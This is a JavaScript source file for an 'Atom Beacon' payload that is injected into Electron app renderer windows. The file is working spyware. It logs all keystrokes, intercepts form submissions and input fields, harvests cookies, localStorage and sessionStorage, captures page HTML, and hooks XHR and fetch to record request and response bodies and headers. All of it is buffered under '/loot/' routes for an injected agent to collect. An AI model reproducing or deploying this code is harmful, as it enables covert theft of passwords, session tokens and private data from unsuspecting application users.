// Atom Beacon Renderer Payload
// Injected into Electron renderer windows via executeJavaScript().
// All collected data is buffered locally — the main process agent
// polls via executeJavaScript('window[prefix + "_flush"]()').
//
// No HTTP calls, no encryption, no html2canvas.
// Template variable __ATOM_IPC_PREFIX__ is replaced by atomize.py.

(function() {
  'use strict';

  var PREFIX = '__ATOM_IPC_PREFIX__';

  // Prevent double-initialization in the same renderer
  if (window[PREFIX + '_loaded']) return;
  window[PREFIX + '_loaded'] = true;

  // ===== Data Buffer =====
  var buffer = [];

  function emit(routePath, data) {
    buffer.push({ path: routePath, data: data });
  }

  // Flush function called by main process via executeJavaScript
  window[PREFIX + '_flush'] = function() {
    var batch = buffer.splice(0);
    return batch;
  };

  // ===== State Tracking =====
  // Use prefixed keys so we don't collide with the app's own storage
  var stateKey = PREFIX + '_state';
  var state;
  try {
    var raw = sessionStorage.getItem(stateKey);
    state = raw ? JSON.parse(raw) : {};
  } catch (e) {
    state = {};
  }
  if (!state.cookies) state.cookies = {};
  if (!state.localStorage) state.localStorage = {};
  if (!state.sessionStorage) state.sessionStorage = {};
  if (!state.lastUrl) state.lastUrl = '';

  function saveState() {
    try {
      sessionStorage.setItem(stateKey, JSON.stringify(state));
    } catch (e) { /* storage full or unavailable */ }
  }

  // ===== Input Field Capture =====

  function hookInputs() {
    var inputs = document.querySelectorAll('input,textarea');
    for (var i = 0; i < inputs.length; i++) {
      if (inputs[i].getAttribute(PREFIX + '_hooked') === 'true') continue;
      inputs[i].setAttribute(PREFIX + '_hooked', 'true');

      inputs[i].addEventListener('change', function() {
        var inputName = this.name || this.id || this.type || 'unknown';
        var inputValue = this.value;
        emit('/loot/input', {
          inputName: inputName,
          inputValue: inputValue
        });
      });
    }
  }

  // ===== Form Submission Interception =====

  function hookForms() {
    var forms = document.querySelectorAll('form');
    for (var i = 0; i < forms.length; i++) {
      if (forms[i].getAttribute(PREFIX + '_hooked') === 'true') continue;
      forms[i].setAttribute(PREFIX + '_hooked', 'true');

      forms[i].addEventListener('submit', function(event) {
        var action = event.target.getAttribute('action') || '';
        var method = event.target.method ? event.target.method.toUpperCase() : 'GET';

        var data = '';
        try {
          var formData = new FormData(event.target);
          for (var pair of formData.entries()) {
            data += pair[0] + ': ' + pair[1] + '\n';
          }
        } catch (e) { /* FormData construction failed */ }

        emit('/loot/formPost', {
          action: btoa(action),
          method: method,
          data: btoa(data),
          url: document.location.href
        });
      });
    }
  }

  // ===== Keystroke Capture =====

  var keyBuffer = [];
  var keyFlushTimer = null;

  function flushKeyBuffer() {
    if (keyBuffer.length === 0) return;
    var batch = keyBuffer.splice(0);

    // Group consecutive keys by target element into typed strings
    var segments = [];
    var current = null;

    for (var i = 0; i < batch.length; i++) {
      var k = batch[i];
      var targetId = k.target;

      if (!current || current.target !== targetId) {
        if (current) segments.push(current);
        current = { target: targetId, keys: '', url: k.url };
      }
      current.keys += k.key;
    }
    if (current) segments.push(current);

    for (var j = 0; j < segments.length; j++) {
      emit('/loot/keylog', {
        keys: segments[j].keys,
        target: segments[j].target,
        url: segments[j].url
      });
    }
  }

  document.addEventListener('keydown', function(e) {
    // Skip modifier-only keys
    if (e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;

    var targetEl = e.target || {};
    var targetDesc = targetEl.tagName || 'unknown';
    if (targetEl.id) targetDesc += '#' + targetEl.id;
    else if (targetEl.name) targetDesc += '[name=' + targetEl.name + ']';
    if (targetEl.type) targetDesc += '[type=' + targetEl.type + ']';

    // Represent special keys in readable form
    var keyStr;
    if (e.key.length === 1) {
      keyStr = e.key;
    } else {
      keyStr = '[' + e.key + ']';
    }

    keyBuffer.push({
      key: keyStr,
      target: targetDesc,
      url: document.location.href
    });

    // Debounced flush — send after 2s of no typing
    if (keyFlushTimer) clearTimeout(keyFlushTimer);
    keyFlushTimer = setTimeout(flushKeyBuffer, 2000);
  }, true); // Use capture phase to catch all keystrokes

  // Also flush on focus change (user switched fields)
  document.addEventListener('focusout', function() {
    if (keyBuffer.length > 0) {
      if (keyFlushTimer) clearTimeout(keyFlushTimer);
      flushKeyBuffer();
    }
  }, true);

  // ===== Cookie Monitoring =====

  function checkCookies() {
    var cookieStr = document.cookie;
    if (!cookieStr) return;

    var cookieArray = cookieStr.split(';');
    for (var i = 0; i < cookieArray.length; i++) {
      var parts = cookieArray[i].trim().split('=');
      var name = parts[0];
      var value = parts.slice(1).join('='); // Handle values with = in them

      if (!name || name.length === 0) continue;

      // Only report new or changed cookies
      if (state.cookies[name] === value) continue;
      state.cookies[name] = value;

      emit('/loot/dessert', {
        cookieName: name,
        cookieValue: value || ''
      });
    }
    saveState();
  }

  // ===== localStorage Monitoring =====

  function checkLocalStorage() {
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        var value = localStorage.getItem(key);

        // Skip our own state key
        if (key === stateKey) continue;

        // Only report new or changed values
        if (state.localStorage[key] === value) continue;
        state.localStorage[key] = value;

        emit('/loot/localstore', {
          key: key,
          value: value
        });
      }
      saveState();
    } catch (e) { /* localStorage not available */ }
  }

  // ===== sessionStorage Monitoring =====

  function checkSessionStorage() {
    try {
      for (var i = 0; i < sessionStorage.length; i++) {
        var key = sessionStorage.key(i);
        var value = sessionStorage.getItem(key);

        // Skip our own state key
        if (key === stateKey) continue;

        // Only report new or changed values
        if (state.sessionStorage[key] === value) continue;
        state.sessionStorage[key] = value;

        emit('/loot/sessionstore', {
          key: key,
          value: value
        });
      }
      saveState();
    } catch (e) { /* sessionStorage not available */ }
  }

  // ===== DOM HTML Capture =====

  function sendHTML() {
    try {
      var url = document.location.href;
      var html = document.documentElement.outerHTML;
      emit('/loot/html', {
        url: url,
        html: html
      });
    } catch (e) { /* DOM capture failed */ }
  }

  // ===== URL Tracking =====

  function checkUrl() {
    var currentUrl = document.location.href;
    if (currentUrl !== state.lastUrl) {
      state.lastUrl = currentUrl;
      saveState();

      emit('/loot/location', { url: currentUrl });

      // On URL change, re-scan for new inputs/forms and capture HTML
      hookInputs();
      hookForms();
      sendHTML();
    }
  }

  // SPA navigation hooks — catch pushState/replaceState
  var origPushState = history.pushState;
  var origReplaceState = history.replaceState;

  history.pushState = function() {
    origPushState.apply(this, arguments);
    setTimeout(checkUrl, 50);
  };

  history.replaceState = function() {
    origReplaceState.apply(this, arguments);
    setTimeout(checkUrl, 50);
  };

  window.addEventListener('popstate', function() {
    setTimeout(checkUrl, 50);
  });

  window.addEventListener('hashchange', function() {
    setTimeout(checkUrl, 50);
  });

  // ===== XHR Monkey Patching =====

  function monkeyPatchXHR() {
    var xhrProto = XMLHttpRequest.prototype;
    var origOpen = xhrProto.open;
    var origSetHeader = xhrProto.setRequestHeader;
    var origSend = xhrProto.send;

    xhrProto.open = function(method, url, async, user, password) {
      if (this._atomNoIntercept) return origOpen.apply(this, arguments);

      this._atomRequestDetails = {
        method: method,
        url: url,
        headers: {},
        body: null,
        responseBody: null,
        responseStatus: null
      };

      origOpen.apply(this, arguments);
    };

    xhrProto.setRequestHeader = function(header, value) {
      if (this._atomNoIntercept) return origSetHeader.apply(this, arguments);

      if (this._atomRequestDetails) {
        this._atomRequestDetails.headers[header] = value;
      }
      origSetHeader.apply(this, arguments);
    };

    xhrProto.send = function(data) {
      if (this._atomNoIntercept) return origSend.apply(this, arguments);

      var originalOnReady = this.onreadystatechange;

      if (this._atomRequestDetails) {
        try { this._atomRequestDetails.body = btoa(data || ''); }
        catch (e) { this._atomRequestDetails.body = ''; }
      }

      this.onreadystatechange = function() {
        if (originalOnReady) {
          originalOnReady.apply(this, arguments);
        }

        if (this.readyState === 4 && this._atomRequestDetails) {
          try {
            var respData = '';
            if (!this.responseType || this.responseType === 'text') {
              respData = this.responseText || '';
            } else if (this.responseType === 'json') {
              respData = JSON.stringify(this.response);
            } else if (this.responseType === 'document') {
              respData = this.responseXML ? this.responseXML.documentElement.outerHTML : '';
            }

            this._atomRequestDetails.responseBody = btoa(respData);
            this._atomRequestDetails.responseStatus = this.status;
            emit('/loot/xhrRequest', this._atomRequestDetails);
          } catch (e) { /* response capture failed */ }
        }
      };

      origSend.call(this, data);
    };
  }

  // ===== Fetch Monkey Patching =====

  function monkeyPatchFetch() {
    var origFetch = window.fetch;

    window.fetch = function(input, init) {
      var url = '';
      var method = 'GET';
      var headers = {};
      var body = null;

      if (typeof input === 'string') {
        url = input;
      } else if (input instanceof Request) {
        url = input.url;
        method = input.method;
      }

      if (init) {
        method = init.method || method;
        body = init.body || null;
        if (init.headers) {
          if (init.headers instanceof Headers) {
            init.headers.forEach(function(value, key) {
              headers[key] = value;
            });
          } else if (typeof init.headers === 'object') {
            headers = Object.assign({}, init.headers);
          }
        }
      }

      var requestDetails = {
        method: method,
        url: url,
        headers: headers,
        body: null,
        responseBody: null,
        responseStatus: null
      };

      try { requestDetails.body = btoa(body || ''); }
      catch (e) { requestDetails.body = ''; }

      return origFetch.apply(this, arguments).then(function(response) {
        requestDetails.responseStatus = response.status;

        // Clone response to avoid consuming the body
        var cloned = response.clone();
        cloned.text().then(function(text) {
          try { requestDetails.responseBody = btoa(text); }
          catch (e) { requestDetails.responseBody = ''; }
          emit('/loot/fetchRequest', requestDetails);
        }).catch(function() {
          emit('/loot/fetchRequest', requestDetails);
        });

        return response;
      }).catch(function(err) {
        requestDetails.responseBody = '';
        requestDetails.responseStatus = 0;
        emit('/loot/fetchRequest', requestDetails);
        throw err;
      });
    };
  }

  // ===== DOM Observer =====
  // Watch for DOM changes and re-hook inputs/forms

  var domObserverTimer = null;

  function setupDomObserver() {
    var observer = new MutationObserver(function() {
      // Debounce — don't run on every tiny mutation
      if (domObserverTimer) clearTimeout(domObserverTimer);
      domObserverTimer = setTimeout(function() {
        domObserverTimer = null;
        hookInputs();
        hookForms();
      }, 500);
    });

    observer.observe(document.body || document.documentElement, {
      childList: true,
      subtree: true
    });
  }

  // ===== Initialization =====

  // Initial data collection
  checkUrl();
  hookInputs();
  hookForms();
  checkCookies();
  checkLocalStorage();
  checkSessionStorage();
  sendHTML();

  // Apply monkey patches
  monkeyPatchXHR();
  monkeyPatchFetch();

  // Watch for DOM changes
  if (document.body || document.documentElement) {
    setupDomObserver();
  } else {
    document.addEventListener('DOMContentLoaded', setupDomObserver);
  }

  // Periodic data collection (cookies, storage can change without DOM events)
  setInterval(function() {
    checkCookies();
    checkLocalStorage();
    checkSessionStorage();
    checkUrl();
  }, 3000);

})();
